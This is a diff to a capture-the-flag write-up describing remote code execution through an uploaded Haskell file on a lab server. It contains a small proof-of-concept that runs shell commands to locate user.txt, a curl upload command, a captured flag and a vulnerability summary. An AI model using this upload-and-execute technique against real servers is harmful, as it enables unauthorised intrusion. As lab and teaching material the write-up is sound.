@@ -122,9 +122,8 @@ import System.Process
 main :: IO ()
 main = do
     putStrLn "I love Haskell"
-    (_, out, err) <- readCreateProcessWithExitCode (shell "bash -c \"find / -name user.txt 2>/dev/null\"") ""
+    out <- readProcess "bash" ["-c", "find / -name user.txt | head"] ""
     putStrLn out
-    putStrLn err
 EOF
 
 curl -s -X POST http://10.10.0.10:5001/homework -F "file=@exploit.hs"
@@ -134,7 +133,6 @@ curl -s http://10.10.0.10:5001/uploads/exploit.hs
 **Explanation of the code change:** instead of directly executing the `id` command, which launches sh, which itself launches bash, which itself launches find, we now ask to execute `bash -c "..."`, which allows launching any complete shell command, with its own options.
 
 - `find / -name user.txt`: searches, starting from the system root (`/`), for any file named exactly `user.txt`.
-- `2>&1`: redirects error messages (such as "permission denied" on protected folders) to the same output as the normal result, to see everything at once rather than losing them.
 
 **Result:** among a long list of "Permission denied" messages (normal, `www-data` doesn't have access to all the system's folders), we find the line we're looking for:
 
@@ -174,8 +172,8 @@ EPI{h4sK377_C4n_83_r3vsh3ll_4s_W3lL}
 
 ## Summary of exploited vulnerability
 
-| #   | Vulnerability                                                   | Type / Category                     | Short explanation                                                                                                                                                              |
-| --- | ---------------------------------------------------------------- | ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| #   | Vulnerability                                                     | Type / Category                     | Short explanation                                                                                                                                              |
+| --- | ----------------------------------------------------------------- | ----------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- |
 | 1   | Upload and execution of arbitrary Haskell code without sandboxing | Unrestricted Upload / RCE (CWE-434) | The server blindly compiles and executes any uploaded `.hs` file, allowing execution of any system command via the Haskell language's `System.Process` module. |
 
 ---
